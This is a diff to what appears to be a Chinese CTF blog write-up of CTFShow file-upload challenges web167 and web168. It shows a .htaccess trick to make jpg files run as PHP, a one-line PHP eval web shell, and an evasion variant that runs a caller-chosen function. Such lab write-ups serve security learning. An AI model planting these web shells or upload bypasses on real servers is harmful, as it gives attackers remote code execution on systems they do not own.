@@ -239,6 +239,24 @@
 <p><a href="http://945a0766-6515-46a4-bbbf-88479bf12c3c.challenge.ctf.show/upload/download.php?file=28696a28293fe023a51d363d03303616.zip">http://945a0766-6515-46a4-bbbf-88479bf12c3c.challenge.ctf.show/upload/download.php?file=28696a28293fe023a51d363d03303616.zip</a></p>
 <p>然后蚁剑连接,在上一级目录即可拿到 flag。</p>
 <p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166_2.png"></p>
+<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_4.png"></p>
+<p>根据题目提示: httpd, 推测能否通过上传 .htaccess 将 jpg 解析为 php 从而拿到 flag?</p>
+<p>首先先上传 .htaccess.jpg ，抓包后 将 jpg 改为 php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167.png"></p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_1.png"></p>
+<p>紧接着上传一句话木马: yjh.jpg</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[lbwnb]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_2.png"></p>
+<p>如图所示上传成功:</p>
+<p>然后读取flag：</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_3.png"></p>
+<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168.png"></p>
+<p>从提示“基础免杀”可以猜到一句话木马的变种写法/骚姿势写法(百度一下):</p>
+<p>ex:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168_1.png"></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
